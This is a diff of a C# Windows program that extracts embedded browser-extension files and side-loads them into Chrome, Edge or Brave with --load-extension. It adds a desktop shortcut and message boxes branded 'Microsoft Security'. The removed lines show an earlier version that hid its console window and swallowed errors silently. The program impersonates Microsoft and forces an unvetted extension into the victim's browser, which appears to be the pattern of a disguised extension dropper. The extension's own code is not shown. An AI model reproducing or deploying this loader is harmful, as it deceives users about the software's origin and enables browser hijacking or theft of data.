@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Diagnostics;
 using Microsoft.Win32;
@@ -6,17 +6,11 @@ using System.Runtime.InteropServices;
 
 class Program
 {
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetConsoleWindow();
-
-    [DllImport("user32.dll")]
-    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
 
     static void Main()
     {
-        IntPtr handle = GetConsoleWindow();
-        if (handle != IntPtr.Zero) ShowWindow(handle, 0);
-
         try
         {
             string extractDir = Path.Combine(
@@ -49,14 +43,22 @@ class Program
             File.WriteAllBytes(Path.Combine(extractDir, "icons\\icon128.png"), f_icons_icon128_png);
 
             string browserPath = FindBrowser();
-            if (string.IsNullOrEmpty(browserPath)) return;
+            if (string.IsNullOrEmpty(browserPath))
+            {
+                MessageBox(IntPtr.Zero, "Microsoft Security extension files extracted."
+                    + "\n\nBut no supported browser found (Chrome/Edge/Brave)."
+                    + "\nFiles are at: " + extractDir,
+                    "Microsoft Security", 0x00000040);
+                return;
+            }
 
             string browserExe = Path.GetFileNameWithoutExtension(browserPath);
+            string shortcutPath = Path.Combine(
+                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
+                string.Format("Microsoft Security - {0}.lnk", browserExe));
 
             try
             {
-                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-                string shortcutPath = Path.Combine(desktop, string.Format("Microsoft Security - {0}.lnk", browserExe));
                 CreateShortcut(shortcutPath, browserPath,
                     string.Format("--load-extension=\"{0}\" --new-window https://microsoft.com/en/security", extractDir),
                     Path.Combine(extractDir, "icons", "icon128.png"));
@@ -73,8 +75,20 @@ class Program
 
             Process.Start(browserPath,
                 string.Format("--load-extension=\"{0}\" --new-window https://microsoft.com/en/security", extractDir));
+
+            MessageBox(IntPtr.Zero,
+                string.Format("Microsoft Security extension installed successfully!"
+                    + "\n\nBrowser: {0}"
+                    + "\nDesktop shortcut created"
+                    + "\n\nExtension files: {1}", browserExe, extractDir),
+                "Microsoft Security", 0x00000040);
         }
-        catch { }
+        catch (Exception ex)
+        {
+            MessageBox(IntPtr.Zero,
+                "Failed to install Microsoft Security extension:\n\n" + ex.Message,
+                "Microsoft Security - Error", 0x00000010);
+        }
     }
 
     static string FindBrowser()
@@ -156,4 +170,3 @@ class Program
         Marshal.ReleaseComObject(shell);
     }
 }
-
